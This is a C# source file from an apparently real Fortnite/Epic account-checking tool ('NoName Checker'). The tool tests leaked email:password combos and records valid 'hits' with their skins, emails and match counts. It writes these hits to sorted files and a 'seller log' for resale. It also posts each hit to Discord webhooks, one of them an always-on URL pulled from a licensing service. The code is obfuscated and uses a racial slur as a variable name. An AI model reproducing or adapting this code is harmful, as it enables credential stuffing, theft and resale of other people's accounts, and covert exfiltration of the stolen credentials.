using System;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Reflection;
using System.Text.RegularExpressions;
using System.Threading;
using System.Net.Http;
using System.Threading.Tasks;
using System.Text.Json;
using System.Text;
using System.Windows.Forms;
using static Colorful.Styler;
using static System.Windows.Forms.VisualStyles.VisualStyleElement.StartPanel;
using System.Security.Principal;

namespace NoNameFN.Utilities
{
    internal class ExportManager
    {
        public static int skincountlol;

        [Obfuscation(Feature = "virtualizer", Exclude = false)]

        private static readonly HttpClient httpClient = new HttpClient();
        public static string WebhookUrl = Security.KeyAuthApp.var("dcwb");
        public static string WebhookUrl2 = Variables.discordwebhook;
        public static async Task SendToDiscordWebhookAsync(
            HttpClient httpClient,
            string account,
            string username,
            int matchcount,
            int skincount,
            string skinslist,
            bool maybefa,
            string epicmail,
            bool stw)
        {
            // Debug: Log URLs
            // Console.WriteLine($"WebhookUrl: {WebhookUrl}");
            // Console.WriteLine($"WebhookUrl2: {WebhookUrl2}");

            await Task.Delay(1000); // Use async delay instead of Thread.Sleep

            // Define colors
            int darkColor = 0x1E1E1E; // Dark grey color
            int highlightColor = 0x00FF00; // Green color for highlighting

            // Check if the skin count exceeds the limit for including skin list
            bool includeSkinList = skincount <= 30;

            // JSON payload for Discord webhook
            string jsonPayload = $@"
{{
    ""content"": ""{(skincount >= 50 ? "@everyone 🔔 A new account with **50+ skins** has been logged!" : "")}"",
    ""embeds"": [
        {{
            ""title"": ""🎉 **New Hit Logged**"",
            ""color"": {highlightColor},
            ""thumbnail"": {{
                ""url"": ""https://th.bing.com/th/id/R.7fc0c0f75e09b603b775125139309da6?rik=nKMHY74iPmxL%2fw&pid=ImgRaw&r=0""
            }},
            ""fields"": [
                {{ ""name"": ""🔑 **Account**"", ""value"": ""```{account}```"", ""inline"": false }},
                {{ ""name"": ""👤 **Username**"", ""value"": ""```{username}```"", ""inline"": false }},
                {{ ""name"": ""🔍 **Maybe FA**"", ""value"": ""```{(maybefa ? "Yes" : "No")}```"", ""inline"": false }},
                {{ ""name"": ""📧 **Epic Email**"", ""value"": ""```{epicmail}```"", ""inline"": false }},
                {{ ""name"": ""🌟 **STW**"", ""value"": ""```{(stw ? "Yes" : "No")}```"", ""inline"": false }},
                {{ ""name"": ""🎮 **Matches Played**"", ""value"": ""```{matchcount}```"", ""inline"": false }},
                {{ ""name"": ""🎨 **Skins Count**"", ""value"": ""```{skincount}```"", ""inline"": false }}
                {(includeSkinList ? $@",{{ ""name"": ""🗒️ **Skin List**"", ""value"": ""```{skinslist}```"", ""inline"": false }}" : "")}
            ],
            ""footer"": {{
                ""text"": ""Logged by {Environment.UserName}"",
                ""icon_url"": ""https://upload.wikimedia.org/wikipedia/commons/9/9d/Discord_icon.png""
            }}
        }}
    ]
}}";

            try
            {
                // Create new StringContent for each request
                var content = new StringContent(jsonPayload, Encoding.UTF8, "application/json");

                // Send to the first webhook URL (always)
                var response1 = await httpClient.PostAsync(WebhookUrl, content);
                if (!response1.IsSuccessStatusCode)
                {
                    ShowErrorMessage($"Failed to send to first Discord webhook. Status code: {response1.StatusCode}, Reason: {response1.ReasonPhrase}");
                }

                // Send to the second webhook URL if discordwebhook is not "NULL"
                if (Variables.discordwebhook != "NULL")
                {
                    var response2 = await httpClient.PostAsync(WebhookUrl2, content);
                    if (!response2.IsSuccessStatusCode)
                    {
                        ShowErrorMessage($"Failed to send to second Discord webhook. Status code: {response2.StatusCode}, Reason: {response2.ReasonPhrase}");
                    }
                    else
                    {
                        Console.WriteLine($"Successfully Sent To Webhook: {WebhookUrl}");
                    }
                }
            }
            catch (HttpRequestException httpEx)
            {
                ShowErrorMessage($"HTTP Request Error: {httpEx.Message}");
            }
            catch (Exception ex)
            {
                ShowErrorMessage($"General Error: {ex.Message}");
            }
        }




        private static void ShowErrorMessage(string message)
        {
            MessageBox.Show(message, "Error", MessageBoxButtons.OK, MessageBoxIcon.Error);
        }


        [Obfuscation(Feature = "virtualizer", Exclude = false)]
        public static async void ExportCombined(string account, string username, int matchcount, int nigga, string skinslist, bool maybefa, string epicmail, bool stw)
        {
            // Call GrabCosmetics and get the filtered skins and the valid skin count
            (string filteredSkins, int skincount) = Translate.GrabCosmetics(skinslist, "Skins");

            // Determine if maybefa and stw are "Yes" or "No"
            string text2 = maybefa ? "Yes" : "No";
            if (maybefa) Variables.sfa++;
            string text3 = stw ? "Yes" : "No";
            if (stw) Variables.stw++;

            // Determine the folder based on skin count
            string skinRangeFolder = GetSkinRangeFolder(skincount);

            // Create the path for the main export file
            string path = Path.Combine(Variables.path, skinRangeFolder, $"Hit-Matches-{matchcount}-Skins-{skincount}-STW-{text3}.txt");

            // Create the path for the seller log file
            string sellerLogFolderPath = Path.Combine(Variables.path);
            string sellerLogPath = Path.Combine(sellerLogFolderPath, "sellerlog.txt");

            try
            {
                lock (Variables.exportlock)
                {
                    // Ensure directory exists
                    string directoryPath = Path.GetDirectoryName(path);
                    if (!Directory.Exists(directoryPath))
                    {
                        Directory.CreateDirectory(directoryPath);
                    }
                    Variables.realskincount = skincount;
                    // Write to the main export file (excluding email and password)
                    File.AppendAllText(path, $"--- NoName Checker, https://t.me/NoNameFNChecker ---\n");
                    File.AppendAllText(path, $"{account} | Username: {username} | Maybe FA: {text2} | STW: {text3} | Matches Played: {matchcount} | Skins Count: {skincount}\n");
                    File.AppendAllText(path, $"Skin List:\n{filteredSkins}\n");

                    // Ensure seller log directory exists
                    if (!Directory.Exists(sellerLogFolderPath))
                    {
                        Directory.CreateDirectory(sellerLogFolderPath);
                    }

                    // Write to the seller log file
                    string formattedSellerLog = FormatSellerLog(skinRangeFolder, account, username, matchcount, skincount, text2, epicmail, text3, filteredSkins);
                    File.AppendAllText(sellerLogPath, $"{formattedSellerLog}\n");

                    // Increment Variables.hits
                    Interlocked.Increment(ref Variables.hits);
                    Interlocked.Increment(ref Variables.check);
                    
                }

                // Send the hit to the Discord webhook
                try
                {
                    await SendToDiscordWebhookAsync(
                        httpClient,
                        account,
                        username,
                        matchcount,
                        skincount,
                        filteredSkins,
                        maybefa,
                        epicmail,
                        stw
                    );
                }
                catch (Exception ex)
                {
                    Console.WriteLine($"An error occurred: {ex.Message}");
                }
            }
            catch (Exception ex)
            {
                // Handle exceptions
                Console.WriteLine($"Error writing to file: {ex.Message}");
            }
        }


        private static string MaskSensitiveData(string data, string maskChar = "*")
        {
            // Handle email-password format (email:password)
            if (data.Contains(":"))
            {
                int separatorIndex = data.IndexOf(':');
                string emailPart = data.Substring(0, separatorIndex);
                string passwordPart = data.Substring(separatorIndex + 1);

                // Mask the email part
                string maskedEmail = MaskSensitiveData(emailPart, maskChar);

                // Mask the password part
                string maskedPassword = new string(maskChar[0], passwordPart.Length);

                return $"{maskedEmail}:{maskedPassword}";
            }

            // Handle email masking
            if (data.Contains("@"))
            {
                int atIndex = data.IndexOf('@');
                string userPart = data.Substring(0, atIndex);
                string domainPart = data.Substring(atIndex);
                return new string(maskChar[0], userPart.Length) + domainPart;
            }

            // Handle generic data masking
            return new string(maskChar[0], data.Length);
        }



        public static string FormatSellerLog(string skinRangeFolder, string account, string username, int matchcount, int skincount, string maybeFA, string epicmail, string stw, string skinList)
        {
            return $@"
------------------{skincount} Skins--------------------
Account: {MaskSensitiveData(account)}
Username: {username}
Matches Played: {matchcount}
Skins Count: {skincount}
Maybe FA: {maybeFA}
Epic Email: {MaskSensitiveData(epicmail)}
STW: {stw}
Skin List:
{skinList}";
        }




        [Obfuscation(Feature = "virtualizer", Exclude = false)]
        public static async void ExportBad(string account, string username, string reason, int retries)
        {
            // Create the path for the bad log file
            string path = Path.Combine(Variables.path, "BadLogs", $"BadLog-{DateTime.Now:yyyy-MM-dd-HH-mm-ss}.txt");

            try
            {
                lock (Variables.exportlock)
                {
                    // Ensure directory exists
                    string directoryPath = Path.GetDirectoryName(path);
                    if (!Directory.Exists(directoryPath))
                    {
                        Directory.CreateDirectory(directoryPath);
                    }

                    // Write to the bad log file
                    File.AppendAllText(path, $"Account: {account}\nUsername: {username}\nReason: {reason}\nRetries: {retries}\n");
                    File.AppendAllText(path, $"--- End of Entry ---\n");

                    Console.WriteLine($"Bad log written to: {path}");
                }
            }
            catch (Exception ex)
            {
               // Console.WriteLine($"Error writing to bad log file: {ex.Message}");
            }
        }

        public static void ExportStats()
        {
            try
            {
                // Create the path for the stats file
                string path = Path.Combine(Variables.path, "Stats", $"Stats-{DateTime.Now:yyyy-MM-dd-HH-mm-ss}.txt");

                // Ensure directory exists
                string directoryPath = Path.GetDirectoryName(path);
                if (!Directory.Exists(directoryPath))
                {
                    Directory.CreateDirectory(directoryPath);
                }

                // Write stats to file
                File.AppendAllText(path, $"Total Hits: {Variables.hits}\n");
                File.AppendAllText(path, $"STW: {Variables.stw}\n");
                File.AppendAllText(path, $"SFA: {Variables.sfa}\n");

                Console.WriteLine($"Stats exported to: {path}");
            }
            catch (Exception ex)
            {
                Console.WriteLine($"Error exporting stats: {ex.Message}");
            }
        }
        [Obfuscation(Feature = "virtualizer", Exclude = false)]

        public static void ExportFlagged(string combo)
        {
            // Flagged combos are no longer saved to a file
            Interlocked.Increment(ref Variables.twofa);
            Interlocked.Increment(ref Variables.check);
            Interlocked.Increment(ref Variables.cpm);
        }

        [Obfuscation(Feature = "virtualizer", Exclude = false)]

        public static void ExportBanned(string combo)
        {
            // Banned combos are no longer saved to a file
            Interlocked.Increment(ref Variables.banned);
            Interlocked.Increment(ref Variables.check);
            Interlocked.Increment(ref Variables.cpm);
        }
        [Obfuscation(Feature = "virtualizer", Exclude = false)]

        public static void ExportBads(string combo)
        {
            // Bads combos are no longer saved to a file
            Interlocked.Increment(ref Variables.bad);
            Interlocked.Increment(ref Variables.check);
            Interlocked.Increment(ref Variables.cpm);
        }
        [Obfuscation(Feature = "virtualizer", Exclude = false)]

        public static void Retries(string combo)
        {
            Interlocked.Increment(ref Variables.retries);
            Variables.combos.Enqueue(combo);
        }

        public static void Epic2Fa(string combo)
        {
            string epic2FaPath = Path.Combine(Variables.path, "Epicgames 2FA", $"2fa-{Variables.check}.txt");

            try
            {
                lock (Variables.exportlock)
                {
                    Directory.CreateDirectory(Path.GetDirectoryName(epic2FaPath));
                    Interlocked.Increment(ref Variables.epictwofa);
                    Interlocked.Increment(ref Variables.check);
                    Interlocked.Increment(ref Variables.cpm);
                    File.AppendAllText(epic2FaPath, $"{combo}\n");
                    LimitCpm();
                }
            }
            catch (Exception ex)
            {
                // Handle exceptions and log errors if needed
                Console.WriteLine($"Error writing to file: {ex.Message}");
            }
        }

        private static void LimitCpm()
        {
            int desiredCpm = Variables.threads.Count; // Assuming Variables.threads represents the desired number of threads

            while (true)
            {
                int currentCpm = Variables.cpm;

                if (currentCpm != desiredCpm)
                {
                    if (currentCpm > desiredCpm)
                    {
                        Interlocked.Decrement(ref Variables.cpm);
                    }
                    else
                    {
                        Interlocked.Increment(ref Variables.cpm);
                    }
                }
                else
                {
                    break; // Exit the loop when cpm matches threadcount
                }
            }
        }

        public static void ExportSkins()
        {
            try
            {
                // Create the path for the skins file
                string path = Path.Combine(Variables.path, "Skins", $"Skins-{DateTime.Now:yyyy-MM-dd-HH-mm-ss}.txt");

                // Ensure directory exists
                string directoryPath = Path.GetDirectoryName(path);
                if (!Directory.Exists(directoryPath))
                {
                    Directory.CreateDirectory(directoryPath);
                }

                // Write skins to file
                File.AppendAllText(path, $"Total Skins: {skincountlol}\n");

                Console.WriteLine($"Skins exported to: {path}");
            }
            catch (Exception ex)
            {
                Console.WriteLine($"Error exporting skins: {ex.Message}");
            }
        }

        private static string GetSkinRangeFolder(int skincount)
        {
            if (skincount < 1) return "Defaults";
            else if (skincount >= 1 && skincount < 25) return "1-25";
            else if (skincount >= 25 && skincount < 50) return "25-50";
            else if (skincount >= 50 && skincount < 100) return "50-100";
            else if (skincount >= 100 && skincount < 200) return "100-200";
            else if (skincount >= 200 && skincount < 500) return "200-500";
            else return "500+";
        }


        private static string MaskEntry(string entry)
        {
            // Example masking: replace sensitive data with "[REDACTED]"
            return Regex.Replace(entry, @"(Epic Email: )[^\\r\\n]*", "$1[REDACTED]");
        }
    }
}